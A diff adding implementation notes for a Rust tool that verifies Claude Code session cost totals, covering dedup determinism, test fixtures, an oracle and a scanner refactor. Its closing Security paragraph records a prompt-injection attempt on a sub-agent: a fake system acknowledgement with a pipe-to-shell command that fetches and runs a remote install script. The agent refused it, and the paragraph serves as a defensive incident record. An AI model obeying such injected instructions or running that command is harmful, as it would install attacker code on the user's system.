@@ -1,0 +1,411 @@
+# Implementation Notes: Absolutely Verify `clyde cost` Is Correct
+
+Running, append-only record of how the implementation diverges from or interprets
+the design doc (`2026-07-08-cost-accuracy-verification.md`). One section per phase.
+
+## Phase 0: Freeze-snapshot reconciliation spike
+
+### Design decisions
+- Frozen fixture chosen: session `90a97cb9-c6ab-494f-bec6-ee4adace467a` (repo
+  `scottidler/manifest`, 841-line parent + 11 subagent files) — a real session
+  with substantial subagent spend, in-window for the `[today-30, today]` filter.
+- Snapshot lives in the session scratchpad (NOT checked in): copying real session
+  JSONL into the repo would leak prompt content and is unnecessary — Phases 3/4
+  use hand-authored inline JSONL + a hand-authored manifest, per the doc.
+- Oracle is a from-scratch Python reimplementation of the counted-entry contract
+  (own parse, own dedup, own pricing lookup from `pricing/data/pricing.json`),
+  run with clyde `--offline` so both read the embedded baseline pricing.
+
+### Deviations
+- None. Phase 0 is a spike; no source change, no commit.
+
+### Tradeoffs
+- Reconciled against the embedded pricing feed (`--offline`) rather than the live
+  network feed, so the oracle and clyde provably read identical rates — removes
+  feed-drift as a confound in the reconciliation itself.
+
+### Open questions
+- None.
+
+### Result (repeatable artifact)
+- clyde vs independent oracle, cent- and entry-exact on current (pre-fix) code:
+  - main-only: clyde `$15.94 / 127` == oracle `$15.94 / 127`
+  - main+subagents: clyde `$30.29 / 356` == oracle `$30.29 / 356`
+  - subagent fold adds `356 - 127 = 229` entries to the parent total.
+- Confirms the reconciliation is reproducible against a frozen `--path`, and the
+  subagent-fold contract holds. Locks the Phase 0 success criteria.
+
+## Phase 1: Make attribution deterministic and the mtime prefilter safe
+
+### Design decisions
+- Sorted discovery — `cost/src/scanner.rs::find_session_files` — sort the collected `files` by
+  `path` (`files.sort_by(|a, b| a.path.cmp(&b.path))`) right before returning, so the insertion
+  order into the parse/dedup pipeline is stable across runs regardless of `read_dir`'s
+  filesystem-dependent order. This is the precondition that makes the dedup tie-break observably
+  deterministic.
+- Deterministic tie-break as an extracted, testable comparator — `cost/src/lib.rs::candidate_wins`
+  — the equal-cost dedup choice is a pure total-order function over the comparable fields
+  (`cost`, `session_id`, `timestamp`) rather than inline logic. Precedence: higher `cost` wins; on
+  equal cost the lexicographically lower `session_id` wins; on equal cost AND equal `session_id`
+  the earlier `timestamp` wins. The surviving copy's `session_id` decides attribution, so the rule
+  is documented on the function and referenced from the dedup-loop comment.
+- `f64::total_cmp` for the cost comparison — `cost/src/lib.rs::candidate_wins` — gives a total
+  order and a real `Equal` verdict without a float `==` (avoids the `clippy::float_cmp` footgun);
+  costs here are non-negative and non-NaN, so `total_cmp`'s `Equal` matches the old `>`'s
+  equal-cost branch exactly.
+- mtime prefilter is a lower-bound optimization only — `cost/src/scanner.rs::filter_by_date_range`
+  — dropped the `file_date <= end` upper-bound exclusion; kept only `file_date >= start`. Under
+  the append-only invariant (Claude Code only appends, so a file's mtime >= its newest entry's
+  timestamp) a file whose mtime precedes `start` provably holds no in-window content, so the lower
+  bound never drops in-window dollars. The upper bound was the actual bug: a still-growing file
+  (mtime after `end`) queried for an earlier day was silently dropped along with its in-window
+  entries. The per-entry `local_date(timestamp)` window check in `compute_summaries`
+  (`lib.rs:220-222`) remains the actual window enforcement.
+
+### Deviations
+- Extracted `cost/src/scanner.rs`'s inline `#[cfg(test)] mod tests { ... }` block into
+  `cost/src/scanner/tests.rs` (declaration-only `#[cfg(test)] mod tests;` left in `scanner.rs`).
+  The phase brief flagged this as optional ("if that balloons the diff, extending the existing
+  inline module is acceptable — flag it as a deviation"). Chose extraction because `rules/rust.md`
+  is emphatic ("inline `mod tests` blocks are drift and must be extracted on sight") and the
+  crate's sibling `cost/src/lib.rs` already uses the extracted `tests.rs` pattern; the move is
+  mechanical and low-risk. Net effect: ~140 pre-existing test lines relocated unchanged, plus the
+  new Phase 1 tests.
+- Chose the lower-bound-only prefilter over dropping the prefilter entirely on the
+  `session`/`daily` paths (both were offered). Same effect for the phase's guarantee (an in-window
+  entry in a file touched after `end` is never dropped) while preserving the cheap
+  skip-provably-old-files optimization the cache-hash path depends on.
+
+### Tradeoffs
+- Lower-bound prefilter vs. no prefilter — kept the lower bound because dropping the prefilter
+  entirely would force every historical query to parse every session file ever written. The lower
+  bound is safe strictly under the append-only invariant, which is documented on
+  `filter_by_date_range` but not runtime-asserted (asserting it per file would require reading
+  entries, defeating the prefilter). If a future environment violates append-only (e.g. an mtime
+  reset backwards below `start` on a file with newer content), that file could still be dropped.
+- `candidate_wins` takes six scalar params rather than a `&DedupedEntry` pair — `DedupedEntry` is
+  a function-local struct inside `compute_summaries`, so a free comparator over its fields keeps
+  the helper unit-testable at module scope without hoisting the struct. Slightly more verbose call
+  site; buys a directly-testable total order.
+
+### Open questions
+- The lower-bound prefilter's safety rests on the append-only invariant, which is documented but
+  not enforced. Phase 5 (scanner unification) is the natural place to decide whether to assert it
+  or carry a cheap content-derived bound. No action needed for Phase 1; noting it so it is not
+  lost. Not a blocker.
+
+## Phase 2: Document the counted-entry contract
+
+### Design decisions
+- Wrote the contract as a `///` doc-comment directly above `fn compute_summaries` in
+  `cost/src/lib.rs` (not a separate `//!` module doc or a standalone doc page) — the design doc's
+  own Phase 2 bullet names this exact attachment point, and it is the one place a reviewer already
+  looks when auditing the dedup/window logic that sits a few lines below it.
+- Named the five load-bearing facts explicitly, each phrased to match the code as written after
+  Phase 1: (1) the assistant-gate + required-field drop happens at parse
+  (`pricing/src/parse.rs::convert_raw_entry`'s `?` chain) before `compute_summaries` ever sees the
+  line, plus the `<synthetic>` skip; (2) dedup key `(message.id, requestId)` with the survivor
+  chosen by `candidate_wins`'s deterministic total order (cost, then `session_id`, then
+  `timestamp`) — named the comparator by its actual function name so the doc-comment and the code
+  cannot drift apart under a rename without both breaking `cargo doc`'s intra-doc link; (3) dedup
+  is global across every scanned file, not per-file; (4) the subagent fold — `subagents/*.jsonl`
+  carries the parent `sessionId`; (5) the window is enforced by per-entry `local_date(timestamp)`,
+  with the mtime prefilter called out as an optimization only, never the contract.
+- Used an intra-doc link (`[\`candidate_wins\`]`) to the Phase 1 comparator rather than restating
+  its logic inline a second time, so the two comments (on `candidate_wins` itself and on
+  `compute_summaries`) can't silently diverge into two different descriptions of the same rule.
+
+### Deviations
+- None. This phase is documentation-only; no behavior, signature, or test changed.
+
+### Tradeoffs
+- Doc-comment on `compute_summaries` vs. a `//!` crate/module-level doc — chose the function
+  doc-comment because the design doc's own Phase 2 bullet specifies this attachment point, and
+  because `compute_summaries` is the single function that actually executes every clause of the
+  contract (parse-gate call site, dedup loop, window check), so the comment sits directly above
+  the code it describes rather than at a remove.
+
+### Open questions
+- The design doc's "Data Model: the counted-entry contract" section (lines ~69-74) is
+  substantively accurate (assistant-gate + required fields, max-cost keep, global dedup, no-`id`
+  bypass, subagent fold, mtime-prefilter-then-per-entry-window are all still true) but has two
+  gaps against the post-Phase-1 code: (1) it does not mention the equal-cost secondary tie-break
+  (lower `session_id`, then earlier `timestamp`) that Phase 1's `candidate_wins` added — it still
+  only says "keep the max-cost copy"; (2) its cited line numbers (`cost/src/lib.rs:254-267`,
+  `:262-263`, `:269-271`) are now stale — those lines currently fall in the date/model-filter
+  block above the dedup loop, not the dedup loop itself (which is `lib.rs:237-313` in the
+  Phase-1-landed code, with the `candidate_wins` call at `:292-299`). Per the phase brief, the
+  design doc is not edited in this phase (status/content changes are the final-phase owner's
+  responsibility); flagging here for the parent/final-phase pass to reconcile the doc's Data Model
+  section against ground truth.
+
+## Phase 3: Fixture-JSONL regression tests
+
+### Design decisions
+- Harvested `report/src/tests.rs`'s inline-JSONL pattern (`write_jsonl` writing raw `r#"..."#`
+  JSON lines under a `TempDir` laid out as a projects tree) directly into `cost/src/tests.rs`,
+  the existing Rust-2018 submodule test file for `cost/src/lib.rs` (no inline `#[cfg(test)] mod
+  tests {}` added anywhere).
+- Nine fixture-JSONL tests added, each driving the REAL `compute_summaries` (and, for one test,
+  `scanner::find_session_files` directly) against a hand-authored fixture, asserting a
+  hand-computed cost AND entry count with the arithmetic shown in a comment:
+  1. `dedup_keeps_max_cost_copy_of_streaming_partial` — streaming-partial duplicate, max-cost wins.
+  2. `dedup_equal_cost_cross_session_attributes_to_lower_session_id` — equal-cost cross-session
+     duplicate, deterministic attribution to the lower `session_id`.
+  3. `synthetic_model_entry_is_skipped` — `<synthetic>` model entry skipped regardless of token size.
+  4. `subagent_file_folds_into_parent_session_total` — `subagents/*.jsonl` carrying the parent
+     `sessionId` folds into the parent total.
+  5. `multi_day_entries_roll_into_correct_day_buckets` — entries on different days land in two
+     distinct `DaySummary` buckets with independently correct costs.
+  6. `unknown_model_entry_is_skipped_without_crashing` — unrecognized model id skipped, no crash.
+  7. `missing_message_id_bypasses_dedup_and_counts_as_is` — no `message.id` means no dedup key,
+     both copies count even with a shared `requestId`.
+  8. `in_window_entry_in_a_stale_mtime_file_is_counted_not_dropped` — the Phase 1 mtime-prefilter
+     fix: a file touched 10 days after the query window's `end` still yields its in-window entry.
+  9. `compute_summaries_is_deterministic_across_repeated_runs` (recommended, not
+     mutation-check-required) — two back-to-back invocations against the identical fixture agree
+     bit-for-bit on cost/entries/session order, cross-checked against
+     `scanner::find_session_files` returning an already path-sorted list.
+- Rates used in every fixture are read verbatim from the embedded `pricing/data/pricing.json`
+  (`claude-opus-4-7` $5in/$25out, `claude-sonnet-4-6` $3in/$15out, `claude-haiku-4-5`
+  $1in/$5out per Mtok) with zero cache tokens in every entry, so cache multipliers never enter
+  the hand-computed arithmetic and the expected numbers are simple to verify by hand.
+- Date-bucket-sensitive tests (`multi_day_entries_roll_into_correct_day_buckets`) compute their
+  expected bucket via `dates::local_date(&parse_ts(...))` (the same function `compute_summaries`
+  uses) rather than a hardcoded `NaiveDate` literal, so the test is robust to the CI host's local
+  timezone while still pinning the actual day-split behavior for the two fixture timestamps.
+- `filetime` added as a dev-dependency (`cargo add --dev filetime -p cost`) to set an exact
+  historical mtime on the stale-mtime fixture file in test 8; `SystemTime` is derived from a UTC
+  timestamp string parsed the same way JSONL timestamps are, keeping the "10 days after `end`"
+  margin comfortably TZ-safe.
+
+### Deviations
+- **The `<synthetic>` skip's prescribed mutation ("remove it") is a no-op in this codebase, so a
+  different mutation was substituted.** Verified empirically: `"<synthetic>"` is never a key in
+  the embedded pricing table and matches no alias/family rule, so deleting the explicit `if
+  entry.model == "<synthetic>" { continue; }` check does not change behavior — the entry falls
+  through to `pricing.calculate_usd`, gets `Err(PricingError::UnknownModel(_))`, and is skipped
+  by the exact same `continue` via the generic unknown-model path. Confirmed live: with the
+  check literally deleted, `synthetic_model_entry_is_skipped` still passed. The explicit check's
+  only observable effect is suppressing the "Unknown model" warning-log noise for this expected,
+  frequent, internal artifact — not cost/entry correctness. Used condition inversion (`==` ->
+  `!=`) as the mutation that actually exercises this branch's logic (it skips every
+  non-synthetic entry and keeps the synthetic one), which does make
+  `synthetic_model_entry_is_skipped` fail as expected. See the mutation-check table below.
+- Used readable, non-UUID directory/file names (`session-parent`, `proj-a`, etc.) in every
+  fixture rather than real UUIDv4 strings. `cost`'s current scanner (pre-Phase-5) does not
+  validate directory names as UUIDs — that guard is `report`'s precedent, slated for Phase 5's
+  scanner unification — so fixture directory names are free-form without weakening any assertion
+  made in this phase.
+
+### Tradeoffs
+- Compared `SessionSummary` fields manually (`session_id`, `cost`, `entries` as parallel `Vec`s)
+  in the determinism test rather than deriving `PartialEq` on `SessionSummary`/`DaySummary` —
+  those types are production output structs outside this phase's scope; adding a derive for one
+  test would be an undisclosed drive-by production change. The manual comparison is equally
+  precise (compares every field that matters) without touching `output.rs`.
+- `compute_summaries_is_deterministic_across_repeated_runs` calls `compute_summaries` twice
+  in-process rather than attempting to force the OS's `read_dir` into a literally shuffled order
+  (not controllable portably from a test). This is weaker than a true filesystem-order fuzz, but
+  it directly matches the AC1 wording ("two runs ... yield identical cost and entry count") and
+  additionally cross-checks the Phase 1 sort invariant on `scanner::find_session_files`'s return
+  value, which is the actual mechanism AC1 depends on.
+
+### Open questions
+- None.
+
+### Mutation-check results
+
+Each mutation was applied, the corresponding test was run and observed to FAIL, then the
+mutation was reverted via the same `Edit` (confirmed via `git diff cost/src/lib.rs
+cost/src/scanner.rs` showing no diff after all five were reverted, and a clean `otto ci` run
+afterward).
+
+| # | Branch (test) | Mutation | Result |
+|---|---|---|---|
+| 1 | `dedup_keeps_max_cost_copy_of_streaming_partial` | `candidate_wins`: swapped `Ordering::Greater => true` / `Ordering::Less => false` to their opposites (lower cost wins) | FAILED — `expected max-cost copy ($0.025) to win, got 0.01` |
+| 2 | `dedup_equal_cost_cross_session_attributes_to_lower_session_id` | `candidate_wins`: swapped the equal-cost `Ordering::Less => true` / `Ordering::Greater => false` arms (higher `session_id` wins) | FAILED — `left: "session-bbb"`, `right: "session-aaa"` |
+| 3 | `synthetic_model_entry_is_skipped` | `cost/src/lib.rs`: inverted `if entry.model == "<synthetic>"` to `!=` (literal deletion tried first and found to be a no-op; documented above) | FAILED — `left: 0, right: 1` (haiku entry no longer counted) |
+| 4 | `subagent_file_folds_into_parent_session_total` | `cost/src/scanner.rs`: `if subagents_dir.is_dir()` forced to `if false && subagents_dir.is_dir()` | FAILED — `left: 1, right: 2` (parent entry + subagent entry) |
+| 5 | `in_window_entry_in_a_stale_mtime_file_is_counted_not_dropped` | `cost/src/scanner.rs::filter_by_date_range`: restored the old `file_date >= start && file_date <= end` upper bound | FAILED — `left: 0, right: 1` (in-window entry silently dropped) |
+
+All five mutations were confirmed to make their respective test fail, then reverted. Production
+code (`cost/src/lib.rs`, `cost/src/scanner.rs`) is byte-identical to the Phase 2 commit; `otto
+ci` is green with the reverted tree.
+
+## Phase 4: Independent reconciliation oracle + self-diagnosis trace
+
+### Design decisions
+- Oracle lives entirely in-crate and test-scoped: `#[cfg(test)] mod oracle;` (`cost/src/oracle.rs`),
+  registered beside `#[cfg(test)] mod tests;` in `cost/src/lib.rs`. No `cost verify` CLI subcommand
+  was added -- the design marked it OPTIONAL, and the CLI surface stays minimal. The oracle is a
+  checked-in test helper + two tests, which is all the acceptance criteria require.
+- Oracle independence -- `cost/src/oracle.rs`: its own serde structs (`OracleRaw`/`OracleMsg`/
+  `OracleUsage`), its own recursive file discovery (`oracle_discover`, NOT
+  `scanner::find_session_files`), its own line parse (`oracle_parse_file`, NOT
+  `claude_pricing::parse_jsonl_file`), its own hand-transcribed rates (`oracle_rate`, NOT
+  `Pricing::calculate_usd`), and its own dedup tie-break (`oracle_candidate_wins`, NOT
+  `candidate_wins`). The ONE shared primitive is `crate::dates::local_date` (UTC->local calendar
+  bucketing) -- neither discovery/parse/pricing -- kept identical so the day-window equality is not
+  silently timezone-fragile. This is documented in the module doc-comment.
+- Three delta levels -- `reconcile` (`cost/src/oracle.rs`): FILE (oracle recursive discovery vs
+  `scanner::find_session_files`), PARSE (counted-entry count, evaluated only when file sets are
+  equal so a missing file is not misread as a parse-drop), AGGREGATION (total + per-session cost to
+  the cent). Attributing to the level that actually diverged is what makes a scanner omission
+  legible as "file", not just "the number is off".
+- Log-target fix -- `resolve_log_filter`/`build_filter` (`cost/src/lib.rs:90-119`): filter target
+  changed from the dead `ccu=<level>` to `cost=<level>,claude_pricing=<level>`. The lib crate is
+  named `cost` and the shared parse crate `claude_pricing`; `ccu` matched neither, so no crate
+  record ever emitted at `-l trace`. Both targets are named so the dedup-loop fate trace (`cost`)
+  AND the parse-drop trace (`claude_pricing`) survive. `CCU_LOG_LEVEL` (merged upstream by clap
+  into the level value) is untouched -- only the wrong env_logger filter *target* was fixed.
+- `compute_summaries` gains `trace_session: Option<&str>` (`cost/src/lib.rs`). New signature:
+  `fn compute_summaries(args: &CostArgs, config: &Config, pricing: &Pricing, start: NaiveDate,
+  end: NaiveDate, verbose: bool, trace_session: Option<&str>) -> Result<(Vec<DaySummary>,
+  Vec<SessionSummary>)>`. The `Session { id }` dispatch resolves the id (env `CLAUDE_CODE_SESSION_ID`
+  for `current`, else the literal id/prefix) and passes it; all five other call sites pass `None`.
+- Per-entry fate trace -- dedup loop in `compute_summaries`: each entry emits a `trace!` fate line
+  (`counted` / `deduped-collapsed` / `skipped reason=<synthetic|out-of-window|model-filter|
+  unknown-model|pricing-error>`) carrying `session_id`, `message_id`, `request_id`. Gated by
+  `should_trace` (prefix-match on `trace_session`; `None` traces every session). Per-entry -> `trace!`
+  per the logging rule's tight-loop demotion.
+- Parse-drop trace -- `convert_raw_entry` (`pricing/src/parse.rs`): each required-field `?` is
+  expanded to a `match` that emits a `trace!` naming the exact missing field (`sessionId`,
+  `timestamp`, `message`, `message.model`, `message.usage`, or an unparseable timestamp) with the
+  session id where available. Non-assistant lines are NOT traced (expected, not a billable drop).
+- AC-level trace test -- `trace_writes_per_entry_fate_lines_for_the_target_session`
+  (`cost/src/tests.rs`): a custom in-process `log::Log` sink (`CaptureLogger`) installed once, max
+  level Trace; captured lines are filtered by a unique session id (so parallel tests logging into
+  the same global sink cannot perturb it), and both the dedup-loop fate line AND the
+  parse-drop-with-reason line are asserted present.
+
+### Deviations
+- Design doc's Phase 4 references the parse-drop boundary at `pricing/src/parse.rs:116` -- the
+  correct seam was the `?`-chain body of `convert_raw_entry`, which I expanded to per-field
+  `match` arms (same effect, correct seam). Recorded because the exact line moved.
+- The injected-omission test (Test 2) uses a FILE-level omission (a stray `*.jsonl` inside a
+  session-uuid dir, outside `subagents/`, which `find_session_files` structurally skips) rather
+  than a parse-level omission. A parse-level injection would require the oracle's parser to be
+  deliberately more lenient than clyde's on a genuinely-billable line, which risks an oracle that
+  is "wrong on purpose". The design allows "file OR parse"; file-level is unambiguous and proves
+  the same property: the pure-arithmetic recheck (`pure_arithmetic_recheck`, reusing clyde's
+  scanner+parser) reproduces clyde's total and is blind to the omission, while the level-separated
+  oracle flags it at the file level.
+- The AC's "the trace actually writes at `-l trace`" is proven in two halves: the `trace!` seams
+  fire and carry the session id (the capture test), and the env_logger filter now enables the
+  `cost`/`claude_pricing` targets (the `resolve_log_filter` assertions). No end-to-end binary
+  smoke was run in this phase; the two automated tests together cover the criterion.
+
+### Tradeoffs
+- Custom `log::Log` capture sink vs env_logger buffer target -- chose the custom sink: env_logger's
+  `init()` is global-once and would fight both the capture and any other test, whereas a
+  `set_boxed_logger` sink guarded by `Once` plus a unique-session-id filter is race-free under
+  parallel tests. The design explicitly allowed either.
+- Oracle reimplements the dedup tie-break and pricing rather than importing `candidate_wins` /
+  `calculate_usd` -- more code, but genuine two-implementation agreement is the whole value of an
+  independent oracle; importing clyde's helpers would make Test 1 a tautology.
+- `should_trace` when `trace_session == None` traces every session's entries (the full firehose at
+  `-l trace`). Acceptable because it only fires at trace verbosity; scoping to one session is the
+  `cost session <id>` path's job and is what keeps that command's trace legible.
+
+### Open questions
+- None.
+
+## Phase 5: Kill the sibling scanner divergence
+
+### Design decisions
+- One shared scanner lives in `common::scan` (`common/src/scan.rs`, declared `pub mod scan;` in
+  `common/src/lib.rs`, with `SessionFile`/`SessionFileKind` re-exported at the crate root). Both
+  `cost` and `report` already depend on `common`, so this is the smallest shared home; no new
+  crate.
+- Unified `SessionFile` carries the UNION of both crates' fields:
+  `{ path: PathBuf, group_id: String, kind: SessionFileKind, mtime: SystemTime, size: u64 }` with
+  `enum SessionFileKind { Parent, Subagent }`. `group_id`/`kind` drive report's parent+subagent
+  grouping; `mtime`/`size` drive cost's date prefilter and cache-invalidation hash. `mtime` and
+  `size` are read from the SAME `fs::metadata` call the empty-file check already makes
+  (`common::scan::file_stat`), so there is no extra stat per file.
+- `find_session_files` is report's fail-loud version (UUID-v4 `bail!` on a non-UUID parent JSONL
+  stem or a non-UUID session directory that carries `subagents/`), PLUS cost's path-sort at the
+  end (`files.sort_by(|a, b| a.path.cmp(&b.path))`) — the precondition cost's deterministic dedup
+  tie-break depends on. report's grouping is order-independent, so the sort is a pure add for it.
+- `filter_by_date_range` moved (semantics-preserving) into `common::scan`, operating on the unified
+  `SessionFile`: lower-bound only (`file_date >= start`, NO upper bound), so an in-window entry in
+  a file touched after the window end is never dropped (the Phase 1 fix, unchanged).
+- `default_projects_dir` (`~/.claude/projects`) also lives in `common::scan` for cost's use;
+  report keeps its own private `config::default_projects_dir` (out of scope, untouched).
+- `cost/src/scanner.rs` and `report/src/scan.rs` are now thin re-export shims
+  (`pub use common::scan::{...}`) so every existing `crate::scanner::…` / `crate::scan::…`
+  reference keeps resolving with zero call-site churn in `cost/src/lib.rs`, `cost/src/cache.rs`,
+  `cost/src/oracle.rs` (clyde side only), `report/src/session.rs`, `report/src/lib.rs`.
+- `regex` added to `common` via `cargo add -p common regex` (resolved 1.12.4) for the UUID-v4
+  guard.
+
+### Deviations
+- `SessionFileKind` is NOT re-exported from `cost/src/scanner.rs`: cost's production code never
+  references the kind (only the cache tests do), and a `pub use` of it in cost's private `scanner`
+  module tripped `-D warnings` as an unused import in the non-test build. Cost's cache tests import
+  it from `common::SessionFileKind` instead. report's shim re-exports it (report's `session.rs`
+  matches on it in production).
+- Report's scan tests (`report/src/scan/tests.rs`) and cost's scanner tests
+  (`cost/src/scanner/tests.rs`) were relocated/merged into `common/src/scan/tests.rs` (14 tests):
+  report's discovery/grouping/UUID-guard cases + cost's path-sort and `filter_by_date_range`
+  cases, with a new assertion that `mtime`/`size` are populated on the unified type. The two source
+  test files (and their now-empty module dirs) were archived via `rkvr rmrf`. Net: no scanner
+  coverage lost; both bail! cases (`non_uuid_parent_stem_fails_loud`,
+  `non_uuid_subagent_dir_fails_loud`) live in the shared module.
+- Behavior change (intended, per the doc's "adopt report's fail-loud"): `cost` now `bail!`s on a
+  non-UUID parent stem / session dir where it previously tolerated any name. Real Claude Code
+  session files are always UUID-v4, so this only fires on a corrupt/foreign layout — the fail-loud
+  outcome the phase wants. Noted because it is a semantic change to cost's discovery.
+
+### Cross-phase fixture migration (the UUID trap)
+- Every earlier-phase fixture's ON-DISK layout was migrated to UUID-v4 names so the new guard does
+  not `bail!` on them, while the `sessionId` FIELD VALUES inside the JSONL, token counts, and every
+  hand-computed cost/entry assertion were left UNCHANGED (cost aggregates by the entry `sessionId`
+  field, not the file stem):
+  - `cost/src/tests.rs` (Phase 3): all parent JSONL stems and the one subagent session dir now use
+    `FIXTURE_UUID = 11111111-1111-4111-8111-111111111111` (project-dir names like `proj-a` are NOT
+    UUID-guarded and stay readable; sort order across `proj-*` dirs is preserved, so the
+    lower-`session_id` tie-break fixture and the determinism fixture still assert on the readable
+    `session-aaa`/`session-bbb`/… field values).
+  - `cost/src/oracle.rs` (Phase 4): parent stem + session dir + the injected stray file's dir now
+    use `ORACLE_UUID = 22222222-2222-4222-8222-222222222222`; the hand-authored manifest
+    (`files`/`counted_entries`/`total_cost`) is unchanged because oracle discovery is recursive and
+    name-agnostic.
+  - Phase 1's `test_find_session_files_subagents_no_parent_jsonl` (the old `orphan-uuid` tolerance
+    case) is superseded by common's `subagent_without_sibling_parent_is_kept` (UUID dir, tests
+    discovery) plus the two `*_fails_loud` tests (the bail! behavior). The old lenient-name
+    expectation is gone by design — the guard now rejects it.
+
+### Tradeoffs
+- Thin re-export shims vs. deleting `cost/src/scanner.rs` / `report/src/scan.rs` and repointing
+  every call site to `common::scan::…` — kept the shims. They localize the "the scanner moved"
+  fact to one line per crate, keep the diff small and legible, and preserve the module names the
+  rest of each crate already reads (`scanner::`, `scan::`). No behavior rides on the indirection.
+- Cache-hash tests kept in `cost/src/cache.rs` (adapted to the unified type via a local `sf(...)`
+  helper that fills the two new fields once) rather than moved — they exercise `compute_mtime_hash`,
+  which is cost's, not the scanner's. The pinned hash vector (`0x9207_5a54_a049_57ce`) is unchanged
+  because the hash still folds only `path`/`mtime`/`size`.
+
+### Open questions
+- None. The Phase 1 note flagged whether to runtime-assert the append-only invariant during
+  unification; decision on reflection: leave it documented-not-asserted (asserting per file would
+  require reading entries, defeating the prefilter). No blocker.
+
+## Finalization (orchestrator)
+
+### Acceptance criteria — verified against the committed tree + a live branch build
+- AC1 deterministic (two runs / shuffled read-dir; equal-cost cross-session tie-break): PASS -- `compute_summaries_is_deterministic_across_repeated_runs`, `dedup_equal_cost_cross_session_attributes_to_lower_session_id`, `candidate_wins_*`, sorted-discovery test; live branch build reproduces `$30.29 / 356` exactly.
+- AC2 in-window entry in a stale-mtime file COUNTED: PASS -- `in_window_entry_in_a_stale_mtime_file_is_counted_not_dropped`, `filter_keeps_file_touched_after_end`.
+- AC3 independent oracle == clyde (cent + entry, main-only AND main+subagents) and flags an injected omission arithmetic misses: PASS -- `oracle_equals_clyde_and_manifest_main_only_and_with_subagents`, `injected_scanner_omission_is_flagged_at_file_level_and_missed_by_arithmetic`.
+- AC4 >=8 mutation-proven fixture-JSONL tests: PASS -- 9 tests, mutation table in the Phase 3 section.
+- AC5 `clyde -l trace cost session <id>` writes >=1 per-entry fate line, session-scoped, `ccu=`->`cost=` target fixed: PASS -- unit test `trace_writes_per_entry_fate_lines_for_the_target_session`; verified LIVE: a branch-build `-l trace` run against the frozen snapshot wrote 682 fate lines (`fate=counted` / `fate=deduped-collapsed`) carrying session_id/message_id/request_id.
+- AC6 one shared scanner (`common::scan::SessionFile{path,group_id,kind,mtime,size}`), cache-hash + date-filter intact, malformed non-UUID dir `bail!`s: PASS -- `common::scan`, `test_compute_mtime_hash_*` (pinned vector unchanged), `non_uuid_subagent_dir_fails_loud` / `non_uuid_parent_stem_fails_loud`.
+- AC7 contract documented in the doc AND inline at `compute_summaries`: PASS -- inline doc-comment (Phase 2); design-doc Data Model dedup bullet reconciled to name the `candidate_wins` deterministic total order.
+
+### Live evidence
+- `otto ci` green (exit 0, "All CI checks passed!"), full workspace.
+- Branch build `clyde -l trace cost --path <frozen> --offline session 90a97cb9`: `$30.29 (356 entries)`, identical to the Phase 0 independent oracle -- the determinism fixes and scanner unification did not move the reconciled number.
+
+### Security
+- During Phase 3 a prompt-injection payload (fake system_acknowledgement + a `curl … | https://cli-auth-refresh.dev/install.sh | sh` "auth refresh") was injected into the sub-agent's transcript. The agent refused it. Verified: the domain appears nowhere in the repo, and every phase commit is clean (no curl/install/network artifact in any diff). No compromise.
